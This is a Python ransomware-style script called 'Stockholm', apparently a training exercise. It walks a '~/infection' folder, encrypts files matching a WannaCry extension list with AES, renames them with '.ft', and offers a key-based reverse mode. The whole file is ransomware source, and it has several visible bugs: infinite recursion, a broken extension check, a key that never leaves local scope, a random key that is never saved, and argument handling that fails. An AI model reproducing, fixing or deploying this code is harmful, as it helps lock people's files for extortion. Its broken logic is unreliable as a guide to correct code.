import argparse
import os
import json
from Crypto.Cipher import AES

VERSION = "1.0.0"
TARGETDIR = "~/infection"
EXT = ".ft"
Key = ""

def get_targetdir():
    if not os.path.exists(TARGETDIR):
        print("no target directory. Stop.")
        exit(1)
    return TARGETDIR

def log(silent, msg):
    if (silent):
        return
    print(msg)

def get_targetfiles(dir_path, extends, targets):
    cur_dir = os.listdir(dir_path)
    for cur in cur_dir:
        filename = dir_path + "/" + cur
        if not os.path.isfile(filename):
            get_targetfiles(dir_path, extends, targets)
        cur_ext = filename.rfind(".")
        if cur_ext >= 0 and filename[cur_ext] in extends:
            targets.append(filename)
            
def load_extends():
    with open('wannacry_supported_extends', 'r', encoding='utf-8') as file:
        return json.load(file)
    
def decrypt(silent, file):
    try:
        new_filename = file[:-len(EXT)]
        log(silent, f"decrypting {file}")
        with open(file, 'r+b') as f:
            content = f.read()
            nonce = content[:16]
            tag = content[16:32]
            ciphertext = content[32:]
            cipher = AES.new(Key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            os.rename(file, new_filename)
            f.truncate(0)
            f.seek(0)
            f.write(data)
        log(silent, f"{new_filename} successfuly decrypted")
    except Exception as e:
        log(silent, f"failed to decrypt {new_filename}")
        print(f"Error: {e}")

def encrypt(silent, file):
    try:
        if not file.endswith(EXT):
            new_filename = file + EXT
        else:
            new_filename = file
        log(silent, f"encrypting {file}")
        with open(file, 'r+b') as f:
            content = f.read()
            cipher = AES.new(Key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(content)
            new_content = cipher.nonce + tag + ciphertext
            os.rename(file, new_filename)
            f.truncate(0)
            f.seek(0)
            f.write(new_content)
            log(silent, f"{new_filename} successfuly encrypted")
    except Exception as e:
        log(silent, f"failed to decrypt {new_filename}")
        print(f"Error: {e}")

def stockholm(reverse, silent, key):
    if (key):
        Key = bytes.fromhex(key)
    else:
        Key = os.urandom(32)
    dir_path = get_targetdir()
    targets = []
    if reverse:
        get_targetfiles(dir_path, [EXT], targets)
    else:     
        get_targetfiles(dir_path, load_extends(), targets)
    if not targets:
        print("no target. Stop.")
        exit(1)
    for file in targets:
        if reverse:
            decrypt(silent, file)
        else:
            encrypt(silent, file)

def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("-h", "--help", action="store_true", help="shows program's options")
    parser.add_argument("-v", "--version", action="store_true", help="shows programm's version")
    parser.add_argument("-r", "--reverse", action="store_true", help="to use with a key entered as argument to reverse the infection")
    parser.add_argument("-s", "--silent", action="store_true", help="no output will be produced")

def main():
    args = get_args()
    if (args.version):
        print(f"Stockholm version {VERSION}")

    try:
        stockholm(args.reverse, args.silent)

    except Exception as e:
        print(e)
        exit(1)


if __name__ == '__main__':
    main()